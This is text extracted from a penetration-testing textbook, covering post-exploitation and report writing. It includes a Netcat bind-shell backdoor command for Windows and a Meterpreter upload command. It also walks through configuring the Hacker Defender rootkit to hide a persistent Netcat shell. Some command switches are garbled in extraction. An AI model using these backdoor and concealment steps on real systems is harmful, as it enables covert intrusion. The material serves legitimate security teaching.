If you are following along and want to practice this section, you will need Netcat installed
in at least two virtual machines (VMs). One instance should be installed in the attacker
machine and one in the target/victim. Netcat is preinstalled in both Backtrack and
Metasploitable. If you have not yet compromised the Metasploitable VM, you may need to
install Netcat on your Windows target before proceeding. Later in this chapter, we will
discuss executing commands remotely, but for now (while we practice), you will be typing
the commands at each local terminal.
[Word Count: 92]

Let us start with a very basic example of howwe can use Netcat. In this example, we
will set up Netcat to serve as a communication channel between two machines. To
set this up on the target/victim machine, we simply need to choose a port and
instruct Netcat to run in listener mode. Assuming your target is a Linux machine,
issuing the following command in a terminal will accomplish this task:
[Word Count: 71]

In the command above, “nc” is used to invoke the Netcat program. The “el” is
used to put Netcat into a listener mode. The “ep” is used to specify the port
number we want Netcat to listen on. After issuing the command, Netcat is
running and waiting to accept an incoming connection on port 1337.
[Word Count: 55]

Now that we have Netcat listening on the target machine, we can move to the
attacker machine. To make a connection to the listening machine, we issue the
following command:
[Word Count: 30]

Post Exploitation and Maintaining Access
CHAPTER 7
169
[Word Count: 8]

To end the “chat” and close the session, we can issue the Ctrl þ C key combi-
nation; this will terminate the Netcat connection. Figure 7.1 shows an example
of this type of communication between two computers.
[Word Count: 37]

Unfortunately, in terms of making a persistent network connection, the Linux
version of Netcat is not quite so straightforward. In order to make the Netcat
connection persistent on a Linux machine, you would have to write a simple
bash script that forces Netcat to restart when the original connection is closed. If
you are interested in creating a persistent connection, there are many examples
to be found on the Internet.
[Word Count: 70]

Although the previous example is an interesting use of Netcat and great for dem-
onstrating the ﬂexibility and power of the tool, in reality, you will probably never
use the “chat” feature during a penetration test. On the other hand, once you have
got Netcat uploaded to your target system, there are many practical uses for the
tool. Let us takea look atsomething a bitmore advantageous, like transferringﬁles.
[Word Count: 68]

Moving ﬁles between computers is easy when we have got the Meterpreter shell
running but remember, we do not want to have to exploit the target every time.
Rather, the goal is to exploit once and then leave a backdoor so we can return at
a later date. If we upload Netcat to the target, we can use the program to transfer
ﬁles to and from our target across a network.
[Word Count: 71]

For this example, assume you want to upload a new ﬁle from your attack
machine to the target machine. With Netcat running on the target machine, we
issue the following command:
[Word Count: 31]

FIGURE 7.1
Using netcat to communicate between two computers.
[Word Count: 9]

The Basics of Hacking and Penetration Testing
170
[Word Count: 8]

This command will force the target to listen for an incoming connection on port
7777. Any input that is received will be stored into a ﬁle named “virus.exe”.
[Word Count: 28]

Unfortunately, by default Netcat does not provide you any type of feedback
letting you know when the transfer has been completed. Because you will receive
no indication when the upload is done, it is best to just wait for a few seconds
and then issue a Ctrl þ C to kill the connection. At this point, you should be able
to run the “ls” command on your target machine and see the newly created ﬁle.
Figure 7.2 shows an example of this process.
[Word Count: 83]

Naturally, you could set up a Netcat connection to pull ﬁles from the target
machine by reversing the commands above.
[Word Count: 20]

Assume you are conducting a penetration test on a target server with an IP
address of 192.168.18.132. During the scanning process, you discover that port
50001 is open. Unfortunately, neither your port scanner nor your vulnerability
scanners were able to determine what service was running behind the report. In
this case, it can be handy to use Netcat to interact with the unknown service. To
force Netcat to attempt a connection to the service, we simply enter the following
command:
[Word Count: 80]

FIGURE 7.2
Using netcat to transfer ﬁles.
[Word Count: 7]

Post Exploitation and Maintaining Access
CHAPTER 7
171
[Word Count: 8]

This command will attempt to create a TCP connection to the port and service.
It is important to note that if you need to interact with a UDP-based service, you
can force Netcat to send UDP packets by issuing the “eu” switch. Once the
connection is made, in most cases, it is easiest to simply enter some text and hit
return key to send the text to the service. If the service responds to the unexpected
request, you may be able to derive its function. Figure 7.3 shows an example
of this.
[Word Count: 92]

As you can see, we used Netcat to create a connection to port 50001. Once
connected, the text “test” was sent through the connection. The service returned
with a response that clearly indicates that the mysterious service is a web server.
And even more important, the server has fully identiﬁed itself as an Apache
server running version 2.2.8 on a Linux Ubuntu machine! If you are following
along in with Metasploitable, you can rerun this exercise by connecting to port
80 on your target.
[Word Count: 84]

Finally, we can use Netcat to bind itself to a process and make that process
available over a remote connection. This allows us to execute and interact with
the bound program as if we were sitting at the target machine itself. If we start
Netcat using the “ee” switch, it will execute whatever program we specify
directly after the “ee”. The program will execute on the target machine and will
only run once a connection has been established. The “ee” switch is incredibly
powerful and very useful for setting up a backdoor shell on a target.
[Word Count: 96]

To set up a backdoor, we will need to utilize the “ee” switch to bind a command
shell from the target machine to a port number. By setting up Netcat in this
manner, later when we initiate a connection to the speciﬁed port, the program
listed after the “ee” switch will run. If we are using a Linux machine, we can
accomplish this by typing the following into a terminal window:
[Word Count: 71]

This will cause the target to serve up a shell to whoever connects to port 12345.
Again, any commands sent from the Netcat client (attack machine) to the target
[Word Count: 29]

FIGURE 7.3
Using netcat to interrogate unknown services.
[Word Count: 8]

The Basics of Hacking and Penetration Testing
172
[Word Count: 8]

machine will be executed locally as if the attacker were sitting physically sitting at
the target.
[Word Count: 16]

This technique can also be used on a Windows machine. To provide command
line backdoor access into a Windows machine, we would run the following on
the target (in a terminal window):
[Word Count: 32]

nc.exe eL ep 12345 c:\Windows\System32\cmd.exe
[Word Count: 5]

Notice, because this is a Windows machine, we are using the “eL” switch to make our
connection persistent. If we close the connection from our machine, Netcat will continue
listening on the speciﬁed port. The next time we connect to the machine, the cmd shell
will be waiting and will execute for us.
[Word Count: 53]

To put the preceding example into context and hopefully make it more concrete
for you, let us examine the following scenario to show how we could implement
Netcat as a backdoor. Consider the following example: assume that we have
successfully exploited a Windows target. Being forward-thinking penetration
testers, we decide to create a more stable backdoor to this system so that we can
return later. In this case, we have decided to use Netcat as our backdoor software.
[Word Count: 78]

The ﬁrst order of business would be to upload Netcat to the target machine; in
this example, the Netcat executable has been uploaded to the target’s System32
directory. Let us assume that we utilized the knowledge gained from Chapter 4
and we are currently using the Meterpreter shell to interact with our target. Once
we have a Meterpreter shell on our target, we can upload the Netcat ﬁle to the
victim by issuing the following command:
[Word Count: 76]

meterpreter > upload nc.exe c:\\windows\\system32
[Word Count: 5]

Note: You will need to upload the Windows (.exe) version of Netcat because the
target is running Windows.
[Word Count: 18]

In this case, we have uploaded the nc.exe program to the Windows\System32
directory. This will allow us to access the cmd.exe program directly. Once Netcat
has been transferred to the target machine, we need to choose a port number,
bind the cmd.exe program, and start Netcat in server mode. This will force
Netcat to wait for an incoming connection on the speciﬁed port. To perform
these tasks, we issue the following command in a terminal (again, assuming you
are already in the same directory as Netcat).
[Word Count: 86]

At this point, Netcat should be running on our target machine. Remember if you
were interested in making this backdoor truly persistent, with the ability to
survive a reboot, you would need to set the Netcat command to automatically
start in the Windows registry.
[Word Count: 44]

Post Exploitation and Maintaining Access
CHAPTER 7
173
[Word Count: 8]

Once Netcat is set up, it is possible to close our Meterpreter shell and make
a connection to the target using Netcat.
[Word Count: 22]

There should be little doubt in your mind that Netcat is a truly powerful and
ﬂexible tool. In this section, we have barely scratched the surface. If you take
some time to dig deeper into the program, you will ﬁnd that people have been
able to perform some rather amazing things using Netcat. You are encouraged to
look into some of these clever implementations by searching the web, the results
will amaze you.
[Word Count: 73]

NETCAT’S CRYPTIC COUSIN: CRYPTCAT
Although Netcat provides some amazing qualities, the program does have a few
shortcomings. First off, it is important to understand that all trafﬁc passed be-
tween a Netcat client and server is done so in clear text. This means that anyone
viewing trafﬁc or snifﬁng the connection will be able to view and monitor all the
information sent between the machines. Cryptcat was introduced to address this
issue. Cryptcat utilizes twoﬁsh encryption to keep the trafﬁc between the client
and the server conﬁdential.
[Word Count: 87]

The beauty of Cryptcat is that you do not need to learn any new commands.
If you have already mastered Netcat, then you have already mastered Cryptcat;
but with Cryptcat, you have the added beneﬁt of transporting your data using
an encrypted tunnel. Anyone viewing or analyzing your network trafﬁc will
not be able to see your information as it passes between the client and
listener.
[Word Count: 66]

One important note about Cryptcat, you should always change the default key.
If you fail to change the default key, anyone will have the ability to decrypt your
session. The default key is metallica and can be changed using the “ek” switch.
[Word Count: 42]

To set up an encrypted tunnel between two machines using Cryptcat, you can
issue the following commands:
[Word Count: 17]

(1) Start the server:
cryptcat el ep 5757
(2) Start the client:
cryptcat 192.168.18.132 5757
[Word Count: 15]

You now have an encrypted tunnel set up between the two machines.
[Word Count: 12]

Just like Metasploit, when people are ﬁrst exposed to the power and cunning of
rootkits, they are usually amazed. To the uninitiated, rootkits appear to have an
almost black-magic-like quality. They are usually simple to install and can
produce amazing results. Running a rootkit gives you the ability to hide ﬁles,
processes, and programs as if they were never installed on the computer.
Rootkits can be used to hide ﬁles from users and even the operating system itself.
[Word Count: 78]

The Basics of Hacking and Penetration Testing
174
[Word Count: 8]

Because rootkits are so effective at hiding ﬁles, they will often be successful at
evading even the most ﬁnely tuned antivirus software. The name rootkit is
typically said to be a derivative of the words “root”, as in root-level or admin-
istrative access, and the “kit” or collection of tools that were provided by the
software package.
[Word Count: 57]

As with everything else and even more so in this case, you must be 100% sure that your
client authorizes the use of rootkits before you deploy them in a penetration test. Utilizing
a rootkit without authorization will be a sure way to quickly end your career and put you
behind bars. Even if you have been fully authorized to conduct a penetration test, double
and triple check that you are speciﬁcally authorized to utilize a rootkit.
[Word Count: 77]

By hooking the request from a piece of software, the rootkit is able to modify the
normal response. Consider the following example: assume that you want to see
what processes are running on a Windows machine. To accomplish this, most
users will depress the key combination “Ctrl þ Alt þ Del”. This will allow the
user to start the task manager and view running processes and services. Most
people perform this task without thinking about it. They examine the process list
presented and move on.
[Word Count: 85]

Post Exploitation and Maintaining Access
CHAPTER 7
175
[Word Count: 8]

It is important to point out that a rootkit is not an exploit. Rootkits are some-
thing that is uploaded to a system after the system has been exploited. Rootkits
are usually used to hide ﬁles or programs and maintain stealthy backdoor access.
[Word Count: 43]

HACKER DEFENDER: IT IS NOT WHAT YOU THINK
[Word Count: 8]

First things ﬁrst; do not let the name fool you, Hacker Defender is a rootkit. It is
not a way to defend hackers! Hacker Defender is a full-ﬂedged Windows rootkit
that is relatively easy to understand and conﬁgure. Hacker Defender is a Win-
dows rootkit, meaning you will need to deploy it on a Windows machine. You
will also need to search the Internet for a copy of Hacker Defender, just be sure to
be more cautious and wary when intentionally downloading and installing
malware!
[Word Count: 85]

There are three main ﬁles included with Hacker Defender that you must be aware
of: hxdef100.exe, hxdef100.ini, and bdcli100.exe. Although the .zip ﬁle will
include several other ﬁles, we will focus our attention on these three. Hxde-
f100.exe is the executable ﬁle that runs Hacker Defender on the target machine.
Hxdef100.ini is the conﬁguration ﬁle where we set up the options we want to use
and list the programs, ﬁles, or services that we want to hide. Bdcli100.exe is the
client software that is used to connect directly to Hacker Defender’s backdoor.
[Word Count: 92]

Once you open the .ini ﬁle, you will see a number of different sections. Each
major section begins with a name enclosed in a square bracket. Figure 7.4 shows
an example of the default conﬁguration ﬁle.
[Word Count: 36]

As you can see in Figure 7.4, there are several headings including [Hidden Table],
[Hidden Processes], [Root Processes], [Hidden Services], and others. You will
also notice that Hacker Defender conﬁguration ﬁle includes a couple of default
entries. These entries are used to hide the Hacker Defender ﬁles and built in
backdoor so you do not have to modify these or make additional changes.
Notice too that the .ini ﬁle supports the use of wildcards with the “*” character.
In this case, any ﬁle that starts with the letters hxdef will automatically be
included in the list.
[Word Count: 96]

Start at the top and work your way through each of the headings. The ﬁrst section
is titled [Hidden Table]. Any ﬁles, directories, or folders listed under this heading
will be hidden from the explorer and ﬁle manager used by Windows. If you
created a folder on the root of the drive as suggested earlier, be sure to list it here.
[Word Count: 61]

The Basics of Hacking and Penetration Testing
176
[Word Count: 8]

Building off of this previous example, we will list “rk” in the [Hidden Table]
section.
[Word Count: 15]

The [Root Processes] section is used to allow programs to interact with and view
the previously hidden folders and processes. Remember that in the previous
sections, we were removing the computer’s ability to detect, see, and interact
with various ﬁles and programs. In this section, we list any programs that we
want to have full control. Any programs listed here will be allowed to view and
interact with programs on the system, including those listed in the [Hidden
Table] and [Hidden Processes] tab.
[Word Count: 83]

If you have any programs that will install as a service or run services like ﬁle
transfer protocol, web servers, backdoors, etc., you will need to list them in the
[Hidden Services] section. Like each of the other sections, the [Hidden Services]
section will hide each of the listed services. Again, when interacting with the task
manager, any program listed here will be concealed from the “services” list.
[Word Count: 68]

You can use the [Hidden RegKeys] to hide speciﬁc registry keys. Almost all
programs create registry keys when they are installed or run on a computer.
[Word Count: 26]

FIGURE 7.4
Screenshot of the hxdef100.ini conﬁguration ﬁle.
[Word Count: 8]

Post Exploitation and Maintaining Access
CHAPTER 7
177
[Word Count: 8]

The [Hidden RegKeys] section can be used to camouﬂage each of these keys. You
will need to make sure that you list them all in order to avoid detection.
[Word Count: 29]

Some instances require more granular control than simply hiding the entire key.
If an entire key is missing (or hidden), a keen system administrator may get
suspicious. To handle these instances, Hacker Defender allows us to use the
[Hidden RegValues]. Entering information here will hide individual values
rather than the entire key.
[Word Count: 52]

The [Startup Run] is a list of programs that will be automatically run once
Hacker Defender has been started. This would be a good place to list the Netcat
command if you were interested in creating a backdoor. Just make sure you put it
in listener mode!
[Word Count: 47]

If you know of ports that you plan to open, you can list them under the
[Hidden Ports] section. You will notice this section is further divided with the
following entries: TCPI, TCPO, and UDP. The “TCPI:” subsection is where you
list any inbound ports that you want hidden from the user. If you have
multiple ports to list, simply separate them by a comma. The “TCPO:” section
is where you list any outbound TCP ports that you want to be hidden from
the user. The “UDP:” section is used to specify any UDP ports that you want
concealed.
[Word Count: 99]

Now that you have an idea of how to conﬁgure the basic Hacker Defender set-
tings, let us examine the tool in action. For this example, we will install Hacker
Defender in a folder on the C:\ drive called “rk”. We will also place a copyof Netcat
into this folder. Figure 7.5 shows an example of the .ini conﬁguration ﬁle.
[Word Count: 60]

You will notice that only a few extra lines have been added to the default con-
ﬁguration ﬁle. In this example, we have added the “rk” folder to the [Hidden
Table] section, the Netcat executable to the [Hidden Processes] section, and
lastly, set up Netcat to automatically start up in server mode and provide a cmd
shell on port 8888 of the target. If you wanted to add an additional layer of
stealth, you could also add 8888 to the [Hidden Ports] section.
[Word Count: 83]

The Basics of Hacking and Penetration Testing
178
[Word Count: 8]

Figure 7.6 shows two screenshots prior to starting Hacker Defender. Notice that
both the “rk” folder and the Netcat (nc.exe) program are visible.
[Word Count: 23]

However, once the hxdef100.exe ﬁle has been executed, the rootkit is in full
force. Figure 7.7 demonstrates that neither the “rk” folder nor the “nc.exe”
program is visible to the user.
[Word Count: 31]

FIGURE 7.5
Newly conﬁgured hxdef100.ini ﬁle.
[Word Count: 6]

FIGURE 7.6
Prior to running the rootkit both folder and program are visible.
[Word Count: 13]

Post Exploitation and Maintaining Access
CHAPTER 7
179
[Word Count: 8]

As you can see, even a simple rootkit like Hacker Defender is quite capable of
masking and hiding ﬁles. Rootkits are a vast topic and we could easily dedicate an
entire book to the technical details and their makeup and inner workings. Rootkit
technology, like all malware, continues to develop at a staggering pace. In order to
truly master rootkits, you will need to begin with a solid understanding of the
operating system kernel. Once you ﬁnish covering the basics, you are highly
encouraged to dive into the malware rabbit hole and see just how deep it goes.
[Word Count: 98]

DETECTING AND DEFENDING AGAINST ROOTKITS
[Word Count: 5]

Let us break from the normal convention of this book and take a minute to
discuss a few defensive strategies for dealing with rootkits. Because we are
focusing on the basics, defending against many of the techniques covered in the
earlier step has been quite simple:
[Word Count: 46]

n
Closely monitor the information you put onto the Internet.
[Word Count: 10]

n
Properly conﬁgure your ﬁrewall and other access control lists.
[Word Count: 10]

n
Make use of an intrusion detection system.
[Word Count: 8]

Although the list is not nearly complete, it is a good starting point for defending
systems. However, even with all of those processes in place, rootkits can still pose
a danger.
[Word Count: 31]

Defending against and detecting rootkits takes a few extra steps. It is important to
understand that in order to conﬁgure and install a rootkit, administrative access is
required. So the ﬁrst step in avoiding rootkits is to deprivilege your users. It is not
uncommon to ﬁnd networks that are loaded with Windows machines where
[Word Count: 54]

FIGURE 7.7
After running the rootkit both folder and program are invisible.
[Word Count: 12]

The Basics of Hacking and Penetration Testing
180
[Word Count: 8]

every user is a member of the administrator group. Usually when inquiring as to
why every user is an administrator, the support staff simply shrugs their shoulders
or provide some lame excuse about the user needing to be administrators to run
a particular piece of software. Really? Come on. This is not 1998. There are very
few legitimate reasons for allowing your users to run around with full admin
rights. Most modern operating systems provide the ability to temporarily elevate
your privileges with the “su” or “Run As” commands.
[Word Count: 89]

Although it is true that many rootkits function at the kernel level and have the
ability to avoid detection by antivirus software, installing, using, and keeping the
software up-to-date is critical. Some rootkits, especially the older and less so-
phisticated versions, can be detected and cleaned by modern antivirus software.
[Word Count: 50]

It is also important to monitor the trafﬁc coming into and going out of your
network. Many administrators are great at monitoring and blocking trafﬁc as it
ﬂows into the network. They spend days and even weeks honing their rule sets to
block incoming trafﬁc. At the same time, many of these admins completely
ignore all outbound trafﬁc. They become so focused on the incoming trafﬁc that
they forget to watch what is leaving. Monitoring outbound trafﬁc can be vital in
detecting rootkits and other malware. Take time to learn about egress ﬁltering.
[Word Count: 93]

Another good tactic for detecting rootkits and backdoors is to regularly port scan
your systems. Make note of each open port on each of your systems. If you ﬁnd
a system with an unknown port open, be sure to track down the PC and identify
the rogue service.
[Word Count: 48]

METERPRETER: THE HAMMER THAT TURNS
EVERYTHING INTO A NAIL
If you learn only one Metasploit payload, it better be meterpreter. We have
brieﬂy mentioned the meterpreter payload and even used it a few times over the
past few chapters. The amount of power and ﬂexibility that a meterpreter shell
provides is both staggering and breathtaking. Once again, meterpreter allows us
to “hack like the movies” but more importantly meterpreter includes a series of
built-in commands, which allow an attacker or penetration tester to quickly and
easily move from the “exploitation” phase to the “post exploitation” phase.
[Word Count: 96]

Post Exploitation and Maintaining Access
CHAPTER 7
181
[Word Count: 8]

As you can see, Table 7.1 provides a substantial list of complex activities, which
the meterpreter shell makes simple. This single payload allows us to very easily
[Word Count: 27]

The Basics of Hacking and Penetration Testing
182
[Word Count: 8]

perform a series of post exploitation activities including migrating the process to
one which is more stable, disable or kill antivirus, upload ﬁles, execute ﬁles, edit,
copy, and delete ﬁles, escalate privileges, dump hashes, install and display
keystrokes, take screenshots of the victims computer, and many more which
were not covered in this list including taking over the web cam, editing the
registry, modifying the target’s routing table and others!
[Word Count: 70]

With all these choices, you may feel a bit overwhelmed or perhaps more accu-
rately, you feel like a kid in a candy store. Below you will ﬁnd a simpliﬁed
methodology for conducting post exploitation with meterpreter. It is important
to understand that this simpliﬁed approach is just one of the many options for
implementing meterpreter.
[Word Count: 56]

Again, given the power and ﬂexibility, your options for post exploitation are
nearly limitless. Spend as much time as possible digging into the payload and
becoming a meterpreter master.
[Word Count: 29]

Like each of the previous steps that have been covered, becoming proﬁcient
with post exploitation tactics and techniques requires practice. Working with
tools like Netcat can seem a bit confusing at ﬁrst, especially when we use the
“ee” switch to provide backdoor functionality. The best way to practice this
[Word Count: 49]

Post Exploitation and Maintaining Access
CHAPTER 7
183
[Word Count: 8]

technique is to set up two machines and practice implementing Netcat be-
tween them. The more you use Netcat, the more comfortable you will become
with the concept.
[Word Count: 28]

You should practice both sending and receiving ﬁles from each machine. It is
important to understand directionality and exactly how to use Netcat to perform
this task both ways (download and uploading). Once the basics of sending and
receiving ﬁles have been mastered, begin focusing on using Netcat as a backdoor.
Remember the “ee” switch is vital in performing this task. Fully understanding
how to implement Netcat as a backdoor will require setting up the tool in
listener mode on the target and making a connection to it from the attacker
machine.
[Word Count: 92]

Be sure to practice setting up a backdoor and establishing a connection with
both Linux and Windows. It is important to master the difference between the
Linux and Windows versions. Remember, a Windows Netcat version can connect
to a Linux version and vice versa; however, there are several minor differences in
the switches and functionality of each program.
[Word Count: 58]

Finally, after becoming proﬁcient with the basics of Netcat, be sure to explore
some advanced features like using Netcat as a proxy, reverse shells, port scan-
ning, creating and copying a disk partition image, and chaining Netcat instances
together to bounce trafﬁc from one machine to another.
[Word Count: 47]

Before wrapping up Netcat, be sure to thoroughly review the “man” pages and
examine each switch. Again, you will want to look closely at the differences
between the Linux and Windows versions. Examining the switches and reading
the “man” pages often provide additional information and can spur some cre-
ative uses of the tool.
[Word Count: 54]

Practicing with rootkits can be a bit of a double-edged sword. Exploring and
learning to use rootkits can be rewarding and valuable but as with all malware,
there is certainly some risk involved. Anytime malware is used or studied, there
is a chance that the malware will escape or infect the host system. Readers are
strongly encouraged to exercise extreme caution before downloading or instal-
ling any type of malware. Advanced malware and rootkit analysis is beyond the
scope of this book and is not recommended.
[Word Count: 86]

If you are still compelled to study these topics, the use of a sandboxed
environment and VMs is a must. Always disconnect all outside access before
proceeding to ensure that nothing escapes your network. Remember that you
are legally responsible for any and all trafﬁc that leaves your network. The
laws that govern computer use at the federal and state levels make no dis-
tinction between trafﬁc that “accidentally” leaves your network and trafﬁc that
is sent on purpose.
[Word Count: 79]

When discussing the basics, rootkits and backdoors are rarely used in a pene-
tration test. It is highly suggested that you focus on mastering each of the other
steps before attempting to advance any further with malware.
[Word Count: 37]

The Basics of Hacking and Penetration Testing
184
[Word Count: 8]

After mastering the basics of backdoors and rootkits, you should expand your
horizon by exploring similar tools including Ncat and Socat. Ncat is a modernized
version of the original Netcat tool and is included as part of the Nmap project. Ncat
improves on the original tool by including many of the original features plus SSL
and IPv6 support. Socat is another close Netcat relative that is great for reading and
writing network trafﬁc. Socat also extends the original functionality of Netcat by
also adding support for SSL, IPv6, and several other advanced features.
[Word Count: 93]

Sub7 was originally released in 1999 by Mobman and functions in a client/server
manner similar to Netbus and Back Oriﬁce. Like each of the other tools discussed
in this chapter, Sub7 is a software that allows a client to remotely control a server.
[Word Count: 43]

If you are interested in expanding your knowledge of rootkits, it is important to
study and master the inner workings of modern operating systems. Learning the
intricate details of an operating system kernel may seem daunting at ﬁrst, but it is
well worth your time.
[Word Count: 45]

This chapter examined the Hacker Defender rootkit and provided a basic over-
view of the functionality and use of rootkits. It is important to understand that
this material only scratches the surface of rootkits. Advanced topics include
hooking system and function calls and understanding the difference between
user-mode and kernel-mode kits. Developing a solid grasp of system-
programming and programming languages can be extremely beneﬁcial as well.
[Word Count: 67]

Post Exploitation and Maintaining Access
CHAPTER 7
185
[Word Count: 8]

CHAPTER 8
Wrapping Up the
Penetration Test
[Word Count: 7]

n
Writing the Penetration Testing Report
[Word Count: 6]

n
You Do Not Have to Go Home But You Cannot Stay Here
[Word Count: 13]

It is not uncommon to ﬁnd extremely gifted hackers and penetration testers who
want to completely ignore this ﬁnal activity. These people have the skill and the
ability to compromise nearly any network, but they lack the skills to commu-
nicate the vulnerabilities, exploits, and mitigations to the client.
[Word Count: 49]

In many respects, writing the penetration testing report is one of the most critical
tasks that an ethical hacker performs. It is important to remember that in many
cases, the better you do your job as a penetration tester, the less your client will
actually notice or “feel” your work. As a result, the ﬁnal report is often the only
tangible evidence that a client will receive from the penetration tester and the
penetration testing (PT) process.
[Word Count: 77]

The Basics of Hacking and Penetration Testing. http://dx.doi.org/10.1016/B978-0-12-411644-3.00008-X
Copyright  2013, 2011 Elsevier Inc. All rights reserved.
[Word Count: 17]

Do not underestimate the power or importance of this phase. In reality,
oftentimes your perceived efforts and success will be judged more on your
report than your actual success or failure to compromise a network. Ultimately,
the ability to write a good penetration testing report will win you business
repeatedly.
[Word Count: 50]

WRITING THE PENETRATION TESTING REPORT
Like every other topic we have discussed, writing a good penetration testing
report takes practice. Many penetration testers mistakenly think that they can
simply provide the raw output from the tools that they run. This group of
people will often collect and neatly organize the various outputs into a single
report. They will gather any pertinent information from the reconnaissance
phase and include it along with the output from Nmap and Nessus.
[Word Count: 77]

Many of the tools we discussed in this book include a reporting engine. For
example, Nessus has several prebuilt reports that can be generated based off the
scan. Unfortunately, using the prebuilt reports is not enough. Each report must
be well laid out and ﬂow as a single document. Combining one style of report
from Nessus with a different style of report from Nmap or Metasploit will make
the penetration test report appear disjointed and unorganized.
[Word Count: 76]

With that being said, it is important to provide the detailed output from each of
your tools. Not many of your clients will have the ability to understand the
technical output from Nmap or Nessus; however, remember the data do belong
to the client and it is important that they have access to the raw data.
[Word Count: 56]

We have discussed several examples of what not to do in a penetration testing
report; let us examine this issue from a different angle and discuss what should be
done.
[Word Count: 30]

First and foremost, the penetration testing report needs to be broken into several
individual pieces. Taken together, these pieces will form your overall report, but
each piece should work as a stand-alone report as well.
[Word Count: 35]

The Basics of Hacking and Penetration Testing
188
[Word Count: 8]

At a minimum, a well-rounded and presented penetration testing report should
include the following:
[Word Count: 14]

1.
An executive summary.
2.
A walkthrough of how the penetration test was performed to provide an
understanding of how you successfully compromised or hacked the system(s).
3.
A detailed report.
4.
Raw output (when requested) and supporting information.
[Word Count: 39]

The executive summary should be a very brief overview of your major ﬁndings.
This document, or subreport, should not exceed two pages in length and only
include the highlights of the penetration test. The executive summary does not
provide technical details or terminology. This report needs to be written in the
context of board members and nontechnical management so that they can
understand your ﬁndings and any major concerns you discovered on the net-
work and systems.
[Word Count: 77]

The second part in a well-rounded penetration testing report is the detailed
report. This report will include a comprehensive list of your ﬁndings as well as
the technical details. The audience for this report includes IT managers, security
experts, network administrators, and others who possess the skills and knowl-
edge required to read and comprehend its technical nature. In most cases, this
report will be used by the technical staff to understand the details of what your
test uncovered and how to address or ﬁx these issues.
[Word Count: 87]

Wrapping Up the Penetration Test
CHAPTER 8
189
[Word Count: 8]

client to take action on the most serious ﬁndings ﬁrst (without having to dig
through 50 pages of technical output).
[Word Count: 20]

The idea and use of proof-of-concept screenshots is a powerful tool and should
be incorporated into the penetration testing report whenever possible. Anytime
you discover a major ﬁnding or successfully complete an exploit, you should
include a screenshot in the detailed report. This will serve as undeniable
evidence and provide the reader with a visualization of your success.
[Word Count: 58]

The Basics of Hacking and Penetration Testing
190
[Word Count: 8]

Providing solutions to each of the problems you discover is a vital part of the
detailed report. It will also serve to win you repeat business and help to dis-
tinguish yourself from other penetration testers.
[Word Count: 36]

Wrapping Up the Penetration Test
CHAPTER 8
191
[Word Count: 8]

Whether you decide to include the raw data as an actual component of the report
or you decide to include it as a separate document is entirely up to you.
Depending on the sheer size of this report, you may want to simply include it as
a secondary or stand-alone report and not attach it directly with the executive
summary and the detailed reports.
[Word Count: 64]

If you have agreed to deliver the document electronically, you will need to ensure
that the penetration testing report is encrypted and remains conﬁdential until it
arrives in the client’s hands. Remember a penetration testing report often con-
tains very sensitive information about the organization. You must ensure the
information contained in the report remains private. It would be very embar-
rassing to have a report you created become public because you did not take the
basic measures needed to ensure conﬁdentiality.
[Word Count: 82]

Each section or individual subreport should be clearly labeled and should
begin on a new page. Under the heading of each report, it may be a good idea
to emphasize to the reader that the penetration test is only a snapshot in time.
The security of networks, computers, systems, and software is dynamic.
[Word Count: 53]

The Basics of Hacking and Penetration Testing
192
[Word Count: 8]

It is worth noting that in this case, the mistake was 100% mine. The guys at
PortSwigger clearly discuss how to change this user name in the conﬁguration
settings and a more careful inspection of the reports would have caught this
before my presentation. Had I properly reviewed the report and ﬁndings,
I would have had plenty of time to correct it (or at least come up with a good
excuse!).
[Word Count: 71]

Wrapping Up the Penetration Test
CHAPTER 8
193
[Word Count: 8]

YOU DO NOT HAVE TO GO HOME BUT YOU
CANNOT STAY HERE
Assuming you have read the entire book (congrats by the way!), you are prob-
ably wondering “what’s next?” The answer to that question depends entirely on
you. First, it is suggested that you practice and master the basic information and
techniques presented in this book. Once you are comfortable with the basics,
move onto the advanced topics and tools covered in the “Where Do I Go from
Here” section of each chapter.
[Word Count: 84]

After mastering all the material in this book, you should have a solid under-
standing of the hacking and penetration testing process. You should feel com-
fortable enough with the basic information that you are able to take on
advanced topics and even specialize.
[Word Count: 44]

It is worth noting, however, that there is much more to hacking and penetration
testing than just running tools. There are entire communities out there that are
built around these topics. You should become active in these communities.
Introduce yourself and learn by asking questions and observing. You should give
back to these communities whenever possible. Hacking, security, and pene-
tration testing communities are available through various websites, online fo-
rums, ICQ, mailing lists, and news groups, and even in person.
[Word Count: 81]

Chat rooms are a great place to learn more about security. Chat rooms are
usually highly focused on a single topic and, as the name implies, typically
involve lots of communication over a wide variety of subtopics pertaining to the
overall theme of the room. In many respects, a chat room is like sitting at a bar
and listening to the conversations around you. You can participate by asking
questions or simply by sitting quietly and reading the conversations of everyone
in the room.
[Word Count: 84]

If you have never been to a security conference (also known as a “CON”), you
owe it to yourself to go. DEFCON is an annual hacker convention held in
Las Vegas at the end of each summer. Yes it is a bit of a circus, yes there are more
than 11,000 people attending, and yes it is hot in Las Vegas in August. But despite
all that, DEFCON remains one of the single, best security communities on earth.
[Word Count: 78]

The Basics of Hacking and Penetration Testing
194
[Word Count: 8]

In general, the crowds are very pleasant, the Goons (ofﬁcial DEFCON workers)
are friendly and helpful, and the community is open and inviting. The price of
admission is peanuts compared to some of the other security events, and one
more thingdthe talks are amazing.
[Word Count: 44]

Another great conference to look into is DerbyCon. DerbyCon is typically held
in Louisville, Kentucky each Fall. Dave Kennedy who helped to organize this
book is one of the cofounders of DerbyCon. This is a rocking conference that
pulls in some of the biggest names in security and offers a more “intimate”
(1000e1500 attendees) experience. You can ﬁnd all the details at http://www.
derbycon.com.
[Word Count: 64]

If you cannot make it to the ofﬁcial DEFCON conference, you should try to get
involved in other security communities that are closer to you. InfraGard,
OWASP, the Kali Linux forums, and many others are great resources for you.
[Word Count: 39]

Reading this book and joining a security community are great ways to expand
your horizons and learn additional and advanced security concepts. Following
a thread or seeing a talk will often spur an interest in a speciﬁc security topic.
[Word Count: 39]

Wrapping Up the Penetration Test
CHAPTER 8
195
[Word Count: 8]

After reading this book, you may be hungry to learn more about a particular
topic, step, or technique that was discussed. Now that you have mastered the
basics, there should be many additional doors open to you. If you have truly
studied, practiced, and understood the basic material presented in this book,
you are equipped to tackle more advanced training.
[Word Count: 60]

If you are interested in a more “hands-on” learning approach, there are many
great two- to ﬁve-day security boot camps available to you. These classes are
often expensive and very labor-intensive, but often highly worth their price of
admission. The Black Hat conference usually offers a series of highly specialized
and focused classes delivered by some of the most well-known names in security
today. There are literally dozens of security topics and specializations to choose
from these events. The trainings change from year to year, but you can ﬁnd them
